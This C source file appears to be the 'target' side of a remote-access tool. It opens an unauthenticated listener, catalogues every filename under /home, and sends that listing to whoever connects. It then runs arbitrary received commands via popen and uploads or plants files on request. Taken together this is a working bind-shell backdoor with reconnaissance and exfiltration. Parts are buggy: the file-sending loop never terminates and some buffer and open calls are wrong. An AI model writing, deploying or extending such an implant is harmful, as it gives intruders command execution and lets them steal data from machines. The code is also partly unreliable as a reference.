#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include "funcs.h"
#include <pthread.h>
#include <dirent.h>
#include <errno.h>
#include <poll.h>
#include <fcntl.h>
#include <ctype.h>


ssize_t my_read(int fd, void *buf, size_t count){
    ssize_t r;
    if( (r = read(fd,buf,count)) < 0 ){
        perror("read");
        exit(1);
    }
    return r;
}

ssize_t my_write(int fd, void *buf, size_t count){
    ssize_t w;
    if( (w = write(fd,buf,count)) < 0){
        perror("write");
        exit(1);
    }
    return w;
}

int my_open(char *filename, int flags){
    int op;
    if( ( op = open(filename, flags)) < 0){
        perror("open");
        exit(1);
    }
    return op;
}

int my_close(int fd){
    int c;
    if( (c = close(fd)) < 0 ){
        perror("close");
        exit(1);
    }
    return c;
}

int my_socket(int domain, int type, int protocol){
    int sock;
    if( (sock = socket(domain,type,protocol)) < 0 ){
        perror("socket");
        exit(1);
    }
    return sock;
}

int my_bind(int fd, const struct sockaddr *addr, socklen_t addrlen){
    int b;
    if( (b = bind(fd,addr,addrlen)) < 0 ){
        perror("bind");
        exit(1);
    }
    return b;
}

int my_listen(int sockfd, int backlog){
    int l;
    if( (l = listen(sockfd,backlog)) < 0 ){
        perror("listen");
        exit(1);
    }
    return l;
}

int my_accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen){
    int a;
    if ((a = accept(sockfd, addr, addrlen)) < 0 ){
        perror("accept");
        exit(1);
    }
    return a;
}

int my_connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen){
    int conn;
    if( (conn = connect(sockfd, addr, addrlen)) < 0 ){
        perror("connect");
        exit(1);
    }
    return conn;
}




struct command parse_argument(int fd){
    char buf[256];
    bzero(buf,256);
    int to_read = my_read(fd,buf,256);
    struct command cmd;
    bzero(&cmd,sizeof(struct command));
    if(!to_read){
        cmd.type = DISCONNECT;
        cmd.cmd_name = NULL;
        cmd.n_args = 0;
        return cmd;
    }
    char* comm = strtok(buf,"\n");
    // Build command struct
    if(comm){
        char* tok = strtok(buf," ");
        if(!strcmp(tok,"get")){
            cmd.type = GET;
            cmd.cmd_name = strdup(strtok(NULL," "));
            return cmd;
        }
        else if(!strcmp(tok,"send")){
            cmd.type = SEND;
            cmd.cmd_name = strdup(strtok(NULL," "));
            return cmd;
        }
        else{
            cmd.type = NORMAL;
            cmd.cmd_name = malloc(strlen(comm)+1);
            bzero(cmd.cmd_name,strlen(comm)+1);
            strncpy(cmd.cmd_name,comm,strlen(comm));
            return cmd;
        }
    }
    else{
        cmd.type = UNKNOWN;
        cmd.cmd_name = NULL;
    }
    return cmd;
}



char* get_args(int argc, char** argv){
    char* port = NULL;
    if(argc != 2 && argc != 1){
        printf("Usage: ./target port\n");
        exit(1);
    }
    if(argc == 1){
        printf("Listening to port 5001...\n");
        port = malloc(sizeof(char)*5);
        bzero(port,sizeof(char)*5);
        strncpy(port,"5001",4);
    }
    else{
        port = malloc(strlen(argv[1])+1);
        bzero(port,strlen(argv[1])+1);
        strncpy(port,argv[1],strlen(argv[1]));
    }
    return port;

}


int SendInfo(int listen_fd){
    printf("Found incoming connection.\n");
    int accept_fd = my_accept(listen_fd, (struct sockaddr*)NULL, NULL);
    //fds[0].fd = accept_fd;
    int fd = my_open("log",O_RDONLY);
    char buf[256] = {0};
    // system info
    printf("Sending system info...\n");
    while(1){
        int r = my_read(fd,buf,255);
        if(!r){
            bzero(buf,256);
            strncpy(buf,"\r",1);
            my_write(accept_fd,buf,255);
            break;
        }
        my_write(accept_fd,buf,255);
        bzero(buf,256);
    }
    printf("===================================\n");
    printf("SENT\n");
    printf("===================================\n");
    // system info
    return accept_fd;

}


int execute_command(struct command cmd,int accept_fd){

    FILE* fp = popen(cmd.cmd_name,"r");
    if(!fp){
        perror("popen");
        int code = -1;
        my_write(accept_fd,&code,sizeof(int));
        return -1;
    }/*
    if(system(cmd.cmd_name) < 0){
        perror(cmd.cmd_name);
        exit(1);
    }*/
    int code = 1;
    my_write(accept_fd,&code,sizeof(int));
    char resp[64];
    bzero(resp,64);
    while(fgets(resp,63,fp) != NULL){
        my_write(accept_fd,resp,63);
        bzero(resp,64);
    }
    strncpy(resp,"\r",1);
    my_write(accept_fd,resp,63);
    return code;
}


void Get(char* file,int fd){
    DIR* dir = opendir(".");
    if(!dir){
        perror("dir_get");
        exit(1);
    }
    struct dirent* pdir = NULL;
    char found = 0;
    while((pdir = readdir(dir))){
        printf("file: %s\n", pdir->d_name);
        if(!strcmp(file,pdir->d_name)){
            printf("FOUND\n");
            found = 1;
        }
    }
    int code = 0;
    if(found)
        code = 2;
    else
        code = 404;
    my_write(fd,&code,sizeof(int));
    if(found){
        char buf[256] = {0};
        int file_d = my_open(file,0666);
        int w = 0, count = 0,r = 0;
        while(1){
	    printf("size of int: %d\n",sizeof(int));
            r = my_read(file_d,buf,255);
            w = my_write(fd,&r,sizeof(int));
            w = my_write(fd,buf,r);
            bzero(buf,256);
            count += w;
        }
        printf("sent: %d bytes\n",count);
        close(file_d);
    }
}

char* Get_File_Name(char* file){
    char* tok = NULL;
    size_t count = 0, pos = 0;
    while(file[pos] != '\0'){
        if(file[pos] == '/')
            count++;
        pos++;
    }
    // File has no slashes
    if(!count)
        return file;
    else{
        pos = 0;
        tok = strdup(file);
        while(pos < count){
            tok = strstr(tok,"/");
            tok++;
            pos++;
        }
        char* name = strtok(tok,"\n");
        return name;
    }
}


void Send(char* file, int fd){
    printf("FILE IS: %s\n",file);
    char* to_save = Get_File_Name(file);
    printf("file is: %s\n", to_save);
    int file_d = open(to_save,O_CREAT|O_WRONLY,0777);
    if(file_d == -1){
        perror("send: open");
        exit(1);
    }
    printf("File_d is: %d\n",file_d);
    int len = 0;
    char msg[256] = {0};
    printf("Receiving file...\n");
    int code = 3;
    my_write(fd,&code,sizeof(int));
    while(1){
        my_read(fd,&len,sizeof(int));
        int r = my_read(fd,msg,len);
        my_write(file_d,msg,len);
        if(r < 255)
            break;
        bzero(msg,256);
    }
    printf("File received!\n");

}


void listen_to_connections(char* port,pthread_mutex_t* mtx){
    int listen_fd = 0,accept_fd = 0;
    struct sockaddr_in addr;
    bzero(&addr,sizeof(addr));
    listen_fd = my_socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(atoi(port));
    my_bind(listen_fd, (struct sockaddr*)&addr,sizeof(addr));
    my_listen(listen_fd,2);
    char msg[256];
    bzero(msg,256);
    // Wait for thread to scan files.
    pthread_mutex_lock(mtx);
    // =====================
    // command listener
    struct pollfd fds[2] = {0};
    fds[0].fd = accept_fd;
    fds[0].events = POLLIN;
    fds[1].fd = listen_fd;
    fds[1].events = POLLIN;
    int timeout = -1;
    int nfds = 2;
    int i = 0;
    struct command cmd = {0};
    while(1){
        int p = poll(fds, nfds, timeout);
        sleep(1);
        if(p < 0){
            perror("poll");
            exit(1);
        }
        else if(p == 0){
            printf("Poll() timed out. Exiting...");
            exit(1);
        }
        for(i=0; i<nfds; i++){
            printf("Connection arrived. %d\n",i);
            if(fds[i].revents == 0)
                continue;
            if (fds[i].revents != POLLIN){
                printf("Error in poll().%d revents is: %d\n",fds[i].fd,fds[i].revents);
                exit(1);
            }
            if(fds[i].fd == listen_fd){
                accept_fd = SendInfo(listen_fd);
                fds[0].fd = accept_fd;
            }
            else if(fds[i].fd == accept_fd){
                cmd = parse_argument(accept_fd);
                if (cmd.type == NORMAL){
                    execute_command(cmd,accept_fd);
                }
                else if(cmd.type == GET){
                    Get(cmd.cmd_name, accept_fd);
                }
                else if(cmd.type == SEND){
                    Send(cmd.cmd_name, accept_fd);
                }
                else if(cmd.type == UNKNOWN){
                    int code = -2;
                    my_write(accept_fd,&code,sizeof(int));
                }
                else{
                    printf("Something went reeeeally bad...\n");
                    int code = -3;
                    my_write(accept_fd,&code,sizeof(int));
                    exit(1);
                }
            }
        }
    }
}

void scan_folder(char* name){
    //printf("name: %s\n",name);
    DIR* dir2 = opendir(name);
    if(!dir2){
        if(errno == EACCES){
            printf("***NO PERMISSION***\n");
            return;
        }
        else{
            perror("dir2");
            exit(1);
        }
    }
    struct dirent* pdir2 = NULL;
    FILE* fp = NULL;
    while((pdir2 = readdir(dir2))){
        if(!strcmp(pdir2->d_name,".") || !strcmp(pdir2->d_name,"..")){
            continue;
        }
        else{
           // printf("----> %s\n",pdir2->d_name);
            //puts(pdir->d_name);
            fp = fopen("log","a");
            if(!fp){
                perror("fopen");
                exit(1);
            }
            fprintf(fp,"%s",pdir2->d_name);
            fprintf(fp,"%s","\n");
            fclose(fp);
            if(pdir2->d_type == DT_DIR){
                char* full_name = malloc(strlen(pdir2->d_name)+strlen(name)+3);
                bzero(full_name,strlen(pdir2->d_name)+2);
                sprintf(full_name,"%s/%s",name,pdir2->d_name);
                scan_folder(full_name);
            }
        }
    }
    closedir(dir2);

}

void* scan_files(void* args){
    pthread_mutex_t* mtx = (pthread_mutex_t*)args;
    printf("Scanning files...\n");
    DIR* dir = opendir("/");
    struct dirent* pdir = NULL;
    FILE* fp = NULL;
    if(!dir){
        perror("dir");
        exit(1);
    }
    while((pdir = readdir(dir))){
        if(!strcmp(pdir->d_name,".") || !strcmp(pdir->d_name,"..")){
            continue;
        }
        else{
            if(!strcmp(pdir->d_name,"home")){
               // puts(pdir->d_name);
                fp = fopen("log","a");
                if(!fp){
                    perror("fopen");
                    exit(1);
                }
                fprintf(fp,"%s",pdir->d_name);
                fprintf(fp,"%s","\n");
                fclose(fp);
                if(pdir->d_type == DT_DIR){
                    char* full_name = malloc(strlen(pdir->d_name)+2);
                    bzero(full_name,strlen(pdir->d_name)+2);
                    sprintf(full_name,"/%s",pdir->d_name);
                    scan_folder(full_name);
                }
            }
        }
    }
    closedir(dir);
    printf("DONE...\n");
    pthread_mutex_unlock(mtx);
    return NULL;
}

void Scan(pthread_mutex_t* mtx){
    pthread_t id;
    pthread_mutex_lock(mtx);
    if (pthread_create(&id,NULL,scan_files,(pthread_mutex_t*)mtx) < 0){
        perror("pthread_create");
        exit(1);
    }

}



